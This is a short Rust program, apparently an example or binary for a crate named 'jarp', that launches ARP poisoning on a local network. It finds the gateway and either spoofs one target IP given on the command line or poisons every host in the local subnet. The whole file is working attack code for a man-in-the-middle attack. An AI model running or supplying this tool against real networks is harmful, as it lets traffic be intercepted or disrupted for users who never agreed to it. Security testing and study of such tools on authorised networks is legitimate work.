extern crate jarp;

use std::net::IpAddr;
use std::str::FromStr;

fn main() {
    let interface = match jarp::get_interface(None) {
        Ok(i) => i,
        Err(e) => panic!("error during interface init: {:?}", e),
    };

    let channel = match jarp::get_channel(&interface, None) {
        Ok(c) => c,
        Err(e) => panic!("error during channel creation: {:?}", e),
    };

    let pool = jarp::get_pool().unwrap();

    let local_ip = match interface.ips.iter().filter(|net| net.is_ipv4()).next() {
        Some(i) => {
            if let IpAddr::V4(ip) = i.ip() {
                ip
            } else {
                panic!("error: no ip found")
            }
        }
        None => panic!("error: no ip found"),
    };

    let gateway = jarp::arp::get_gateway(&interface.name).unwrap();

    if std::env::args().count() > 1 {
        let ip: String = std::env::args().skip(1).take(1).collect();
        let ip = std::net::Ipv4Addr::from_str(&ip).unwrap();
        let mac =
            jarp::arp::query_mac_addr(&channel, &interface.mac_address(), &local_ip, &ip).unwrap();
        jarp::arp::poison(
            &channel.sender,
            &interface.mac_address(),
            &gateway,
            &ip,
            &mac,
            pool,
        )
        .unwrap();
    } else {
        jarp::arp::poison_network(
            &channel.sender,
            &interface.mac_address(),
            &gateway,
            jarp::arp::get_cidr(&local_ip, &interface.name).unwrap(),
            pool,
        )
        .unwrap();
    }
}
